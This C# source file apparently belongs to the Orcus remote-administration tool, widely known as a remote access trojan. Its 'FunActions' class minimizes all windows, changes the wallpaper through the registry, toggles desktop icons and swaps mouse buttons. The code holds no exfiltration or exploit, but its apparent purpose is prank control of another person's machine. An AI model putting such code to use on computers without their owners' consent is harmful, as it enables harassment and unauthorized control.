using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Microsoft.Win32;
using Orcus.Native;
using Orcus.Utilities;

namespace Orcus.Commands.FunActions
{
    public static class Computer
    {
        public enum Style
        {
            Tiled,
            Centered,
            Stretched
        }

        public static void MinimizeAllScreens()
        {
            var lHwnd = NativeMethods.FindWindow("Shell_TrayWnd", null);
            NativeMethods.SendMessage(lHwnd, WM_COMMAND, (IntPtr) MIN_ALL, IntPtr.Zero);
        }

        public static void RestoreAllScreens()
        {
            IntPtr lHwnd = NativeMethods.FindWindow("Shell_TrayWnd", null);
            NativeMethods.SendMessage(lHwnd, WM_COMMAND, (IntPtr) MIN_ALL_UNDO, IntPtr.Zero);
        }

        public class DesktopWallpaperRestoreInfo
        {
            public string WallpaperStyle { get; set; }
            public string TileWallpaper { get; set; }
            public string WallpaperPath { get; set; }

            public void Restore()
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
                {
                    if (key == null)
                        return;

                    key.SetValue("WallpaperStyle", WallpaperStyle);
                    key.SetValue("TileWallpaper", TileWallpaper);
                    key.SetValue("Wallpaper", WallpaperPath);
                }

                NativeMethods.SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    WallpaperPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }

        public static void SetDesktopWallpaper(Image newWallpaper, Style style, out DesktopWallpaperRestoreInfo desktopWallpaperRestoreInfo)
        {
            desktopWallpaperRestoreInfo = null;
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            newWallpaper.Save(tempPath, ImageFormat.Bmp);

            using (var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
            {
                if (key == null)
                    return;

                desktopWallpaperRestoreInfo = new DesktopWallpaperRestoreInfo
                {
                    TileWallpaper = (string) key.GetValue("TileWallpaper"),
                    WallpaperStyle = (string) key.GetValue("WallpaperStyle"),
                    WallpaperPath = (string) key.GetValue("Wallpaper")
                };

                switch (style)
                {
                    case Style.Tiled:
                        key.SetValue("WallpaperStyle", 1.ToString());
                        key.SetValue("TileWallpaper", 1.ToString());
                        break;
                    case Style.Centered:
                        key.SetValue("WallpaperStyle", 1.ToString());
                        key.SetValue("TileWallpaper", 0.ToString());
                        break;
                    case Style.Stretched:
                        key.SetValue("WallpaperStyle", 2.ToString());
                        key.SetValue("TileWallpaper", 0.ToString());
                        break;
                    default:
                        throw new ArgumentOutOfRangeException(nameof(style));
                }

                NativeMethods.SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    tempPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }

        public static void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            var hWnd = WindowHelper.GetDesktopWindow(DesktopWindow.ProgMan);
            NativeMethods.SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
        }

        public static void SwapMouseButtons()
        {
            NativeMethods.SwapMouseButton(1);
        }

        public static void RestoreMouseButtons()
        {
            NativeMethods.SwapMouseButton(0);
        }

        // ReSharper disable InconsistentNaming
        private const int WM_COMMAND = 0x111;
        private const int MIN_ALL = 419;
        private const int MIN_ALL_UNDO = 416;

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;
        // ReSharper restore InconsistentNaming
    }
}